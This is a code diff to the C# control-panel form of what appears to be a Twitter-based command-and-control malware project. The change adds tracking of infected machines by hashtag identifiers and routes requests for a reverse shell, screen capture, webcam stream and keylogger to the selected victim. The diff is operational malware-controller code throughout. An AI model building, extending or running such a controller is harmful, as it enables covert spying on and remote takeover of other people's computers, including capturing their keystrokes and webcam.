@@ -11,11 +11,13 @@ using System.Net.Sockets;
 using System.IO;
 using TwitterCommandAndControl;
 using TwitterCommandAndControl.Handlers;
+using TwitterCommandAndControl.Core;
 
 namespace ControlCenter
 {
     public partial class Main : Form
     {
+        private Tracker tracker = null;
         private Screen display;
         private TcpClient _client;
         private TcpClient Client 
@@ -34,13 +36,40 @@ namespace ControlCenter
             InitializeComponent();
         }
 
+        private void Main_Load(object sender, EventArgs e)
+        {
+            ShellPrefix.SelectedIndex = 0;
+
+            tracker = Tracker.New(x =>
+            {
+                var split = x.Split(new string[] { "#unique=" }, StringSplitOptions.RemoveEmptyEntries);
+                if (split.Length == 2)
+                {
+                    ShellPrefix.Invoke(new MethodInvoker(() => {
+                        var unique = "#" + split[1];
+                        foreach (var item in ShellPrefix.Items)
+                        {
+                            if (item.ToString() == unique)
+                                return;
+                        }
+                        ShellPrefix.Items.Add(unique); 
+
+                    }));
+                }
+            },
+            track: ShellPrefix.SelectedItem.ToString(),
+            log: null);
+        }  
+
         private void ShellButton_Click(object sender, EventArgs e)
         {
             ShellButton.Enabled = false;
             ShellOutput.AppendText("Waiting for reverse shell..." + Environment.NewLine);
+            var hashtag = ShellPrefix.SelectedItem.ToString();
             Task.Run(() =>
             {
-                Client = ReverseShellHandler.Request(ShellPrefix.Text);
+
+                Client = ReverseShellHandler.Request(hashtag);
                 ShellButton.Invoke(new MethodInvoker(() => { ShellButton.Enabled = true; }));
                 if (Client != null && Client.Connected)
                 {
@@ -94,12 +123,13 @@ namespace ControlCenter
         {
             ScreenCapture.Enabled = false;
             ShellOutput.AppendText("Requesting Screen Capture..." + Environment.NewLine);
+            var hashtag = ShellPrefix.SelectedItem.ToString();
             if (display != null) display.Close();
             display = new Screen();
             display.Show();
             Task.Run(() =>
             {
-                Client = ScreenCaptureHandler.Request(ShellPrefix.Text);
+                Client = ScreenCaptureHandler.Request(hashtag);
                 ScreenCapture.Invoke(new MethodInvoker(() => { ScreenCapture.Enabled = true; }));
                 if (Client != null && Client.Connected)
                 {
@@ -118,13 +148,14 @@ namespace ControlCenter
         {
             Webcam.Enabled = false;
             ShellOutput.AppendText("Requesting Webcam..." + Environment.NewLine);
+            var hashtag = ShellPrefix.SelectedItem.ToString();
             if (display != null) display.Close();
             display = new Screen();
             display.IsStreaming = true;
             display.Show();
             Task.Run(() =>
             {
-                Client = WebcamHandler.Request(ShellPrefix.Text);
+                Client = WebcamHandler.Request(hashtag);
                 Webcam.Invoke(new MethodInvoker(() => { Webcam.Enabled = true; }));
                 if (Client != null && Client.Connected)
                 {
@@ -143,10 +174,10 @@ namespace ControlCenter
         {
             KeyLogger.Enabled = false;
             ShellOutput.AppendText("Requesting Key Logger..." + Environment.NewLine);
-            
+            var hashtag = ShellPrefix.SelectedItem.ToString();
             Task.Run(() =>
             {
-                Client = KeyLoggerHandler.Request(ShellPrefix.Text);
+                Client = KeyLoggerHandler.Request(hashtag);
                 KeyLogger.Invoke(new MethodInvoker(() => { KeyLogger.Enabled = true; }));
                 if (Client != null && Client.Connected)
                 {
@@ -164,8 +195,6 @@ namespace ControlCenter
         private void ShellOutput_DoubleClick(object sender, EventArgs e)
         {
 
-        }
-
-        
+        }     
     }
 }
